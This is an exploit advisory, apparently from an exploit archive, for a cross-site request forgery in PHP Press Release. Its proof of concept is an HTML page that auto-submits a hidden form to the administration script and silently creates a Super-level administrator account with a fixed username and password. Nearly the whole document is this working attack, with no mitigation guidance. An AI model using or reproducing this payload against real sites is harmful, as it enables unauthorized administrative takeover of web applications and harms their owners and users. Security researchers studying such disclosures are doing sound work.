@@ -1,0 +1,35 @@
+# Exploit Title :              PHP Press Release - Cross-Site Request Forgery (Add Admin - Super User )
+# Author :                     Besim
+# Google Dork :                 -
+# Date :                       09/10/2016
+# Type :                       webapps
+# Platform :                   PHP
+# Vendor Homepage :   http://www.pagereactions.com/product.php?pku=1
+ Software link :
+ http://www.pagereactions.com/downloads/phppressrelease.zip
+
+
+
+########################### CSRF PoC ###############################
+
+
+<html>
+  <!-- CSRF PoC  -->
+  <body>
+    <form action="http://sitename/phppressrelease/administration.php" method="POST">
+      <input type="hidden" name="pageaction" value="saveuser" />
+      <input type="hidden" name="subaction" value="submit" />
+      <input type="hidden" name="username" value="murat" />
+      <input type="hidden" name="password" value="murat" />
+      <input type="hidden" name="userfullname" value="murat&#32;tester" />
+      <input type="hidden" name="accesslevel" value="Super" />
+      <input type="hidden" name="userstatus" value="active" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      *document.forms[0].submit();*
+    </script>
+  </body>
+</html>
+
+####################################################################
